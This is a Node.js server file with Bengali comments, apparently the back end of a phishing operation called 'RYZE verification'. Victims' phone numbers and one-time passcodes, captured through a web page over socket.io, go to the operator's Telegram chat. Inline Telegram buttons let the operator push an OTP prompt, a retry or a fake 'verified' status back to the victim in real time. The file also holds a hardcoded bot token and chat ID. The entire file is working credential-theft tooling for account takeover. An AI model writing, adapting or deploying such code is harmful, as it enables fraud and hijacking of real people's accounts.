const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { Telegraf, Markup } = require('telegraf');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const BOT_TOKEN = '8599585292:AAENAD4zbqo8bJL3XPzhcyAwdkR3buB_3gM';
const MY_CHAT_ID = '5967798239';
const bot = new Telegraf(BOT_TOKEN);

app.use(express.static('public'));

// Render স্লিপ মোড প্রতিরোধ করার জন্য একটি রুট
app.get('/ping', (req, res) => res.send('Awake!'));

const activeUsers = {};

io.on('connection', (socket) => {
    
    // ১. ফোন নম্বর পাওয়ার পর
    socket.on('send_phone', async (phone) => {
        activeUsers[socket.id] = { phone: phone };

        // টেলিগ্রামে মেসেজ পাঠানো (Mono style এ নম্বর যাতে টাচ করলে কপি হয়)
        const msg = await bot.telegram.sendMessage(MY_CHAT_ID, 
            `👤 *নতুন ইউজার সেশন*\n\n📱 নম্বর: <code>${phone}</code>\n⏳ স্ট্যাটাস: অপেক্ষমান...`, 
            {
                parse_mode: 'HTML',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🔢 OTP বক্স পাঠাও', `ask_otp_${socket.id}`)],
                    [Markup.button.callback('❌ ভুল নম্বর', `retry_phone_${socket.id}`)]
                ])
            }
        );
        // মেসেজ আইডি সেভ করে রাখা যাতে পরে এডিট করা যায়
        activeUsers[socket.id].telegramMsgId = msg.message_id;
    });

    // ২. OTP পাওয়ার পর
    socket.on('send_otp', (otp) => {
        const user = activeUsers[socket.id];
        if (!user) return;

        bot.telegram.editMessageText(MY_CHAT_ID, user.telegramMsgId, null,
            `👤 *ইউজার সেশন*\n\n📱 নম্বর: <code>${user.phone}</code>\n📩 প্রাপ্ত OTP: <code>${otp}</code>\n\nমেলাতে সুবিধা হলে ভেরিফাই করুন।`,
            {
                parse_mode: 'HTML',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('✅ সঠিক (Success)', `verify_success_${socket.id}`)],
                    [Markup.button.callback('❌ ভুল (Retry)', `verify_fail_${socket.id}`)]
                ])
            }
        );
    });

    socket.on('disconnect', () => {
        // ডিসকানেক্ট হলে ডিলিট করছি না কারণ টেলিগ্রাম সেশন চলতে পারে
    });
});

// টেলিগ্রাম বাটন অ্যাকশন
bot.action(/ask_otp_(.+)/, (ctx) => {
    const socketId = ctx.match[1];
    io.to(socketId).emit('show_otp_input');
    
    const user = activeUsers[socketId];
    ctx.editMessageText(`👤 *ইউজার সেশন*\n\n📱 নম্বর: <code>${user.phone}</code>\n⏳ স্ট্যাটাস: OTP এর জন্য অপেক্ষা করছে...`, { parse_mode: 'HTML' });
});

bot.action(/retry_phone_(.+)/, (ctx) => {
    const socketId = ctx.match[1];
    io.to(socketId).emit('retry_phone');
    ctx.editMessageText(`❌ নম্বর ভুল বলে রিজেক্ট করা হয়েছে।`);
});

bot.action(/verify_success_(.+)/, (ctx) => {
    const socketId = ctx.match[1];
    io.to(socketId).emit('final_status', { status: 'success' });
    const user = activeUsers[socketId];
    ctx.editMessageText(`✅ <code>${user.phone}</code> ভেরিফাইড সফল!`, { parse_mode: 'HTML' });
});

bot.action(/verify_fail_(.+)/, (ctx) => {
    const socketId = ctx.match[1];
    io.to(socketId).emit('final_status', { status: 'fail' });
    const user = activeUsers[socketId];
    ctx.editMessageText(`👤 *ইউজার সেশন*\n\n📱 নম্বর: <code>${user.phone}</code>\n❌ স্ট্যাটাস: ভুল OTP! আবার ইনপুট দিতে বলা হয়েছে।`, {
        parse_mode: 'HTML',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('🔢 আবার OTP বক্স পাঠাও', `ask_otp_${socketId}`)]
        ])
    });
});

bot.launch();

// Render স্লিপ মোড বন্ধ রাখার জন্য সেলফ-পিং লজিক
setInterval(() => {
    http.get(`https://ryze-verification.onrender.com/ping`); // এখানে আপনার রেন্ডার ইউআরএল দিবেন
}, 10 * 60 * 1000); // প্রতি ১০ মিনিটে একবার পিং করবে

server.listen(3000, () => {
    console.log('RYZE Server Running...');
});
